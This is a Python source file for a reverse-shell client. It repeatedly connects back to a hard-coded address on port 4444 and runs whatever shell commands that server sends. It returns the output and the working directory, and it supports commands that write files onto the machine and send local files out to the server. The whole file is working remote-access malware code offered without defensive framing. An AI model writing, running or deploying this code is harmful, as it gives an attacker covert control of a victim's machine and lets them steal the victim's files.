import socket
import os
import subprocess
import time

HOST = '192.168.0.2'
PORT = 4444
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase

# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

def connect():

    while True:
        # try listening for host
        try:
            global Socket
            # create socket object
            Socket = socket.socket()
            # connect to server
            Socket.connect((HOST, PORT))
            break
        # if initial connection fails, pause for a second and rerun the loop
        except Exception as e: # e is a baked in exeption
            time.sleep(1)

    # when client connects to server, it sends its directory to the server before anything else
    cwd = os.getcwd()
    Socket.send(cwd.encode())

connect()

# loop allows for commands to be recieved, executed and send outputs continuously
while True:
    
    # inner loop allows for disconnect and reconnect functionality
    while True:
        # receive the command from the server
        try:
            command = Socket.recv(BUFFER_SIZE).decode()
            break
        except Exception as e:
            time.sleep(1)
            connect()

    #seperates the command in two
    splited_command = command.split()

    # if the command is exit, restart the loop to re-listen for a server
    if command.lower() == "exit":
        Socket.close()
        continue

    # if the first half of the seperated command is cd...
    if splited_command[0].lower() == "cd":
        # ...connect cd with the 2nd half of the splitted command
        try:
            os.chdir(' '.join(splited_command[1:]))
            # if an error occurs, send FileNotFoundError to the socket
        except FileNotFoundError as e:
            output = str(e)
            # if the command is sent successfully, output nothing
        else:
            output = ""

    elif splited_command[0].lower() == "upload":
        file_path = splited_command[1]
        try:
            # Receive the file size and file contents together
            received_data = Socket.recv(BUFFER_SIZE)

            # Split the received data into file size and file contents
            file_size_str, file_contents = received_data.split(b'|', 1)  # Assuming '|' is the delimiter
            file_size = int(file_size_str.decode())

            # Write the file contents to the file
            with open(file_path, "wb") as f:
                f.write(file_contents)

            output = f"File '{file_path}' uploaded successfully."
        except Exception as e:
            output = f"Error uploading file: {e}"
            print(e)  # Print the error for debugging purposes

    elif command.lower().startswith("download"):
        file_path = command.split()[1] # the 2nd part of the file path aka the words after "download"

        # get the size of the file
        file_size = os.path.getsize(file_path) 
        # send off file size first
        Socket.send(str(file_size).encode())

        # if the file is located, read the contents and send the contents
        if os.path.exists(file_path):
            with open(file_path, "rb") as f:
                Socket.sendfile(f)
                output = f"|File '{file_path}' downloaded successfully."
        else:
            print('File not found')
            #continue

        # if the command isn't exit and the splitted command isn't cd, run the command and show the output
    else:
        output = subprocess.getoutput(command)
    # get potentially new directory
    cwd = os.getcwd()
    # send the command output and new directory to the server socket
    message = f"{output}{SEPARATOR}{cwd}"
    Socket.send(message.encode())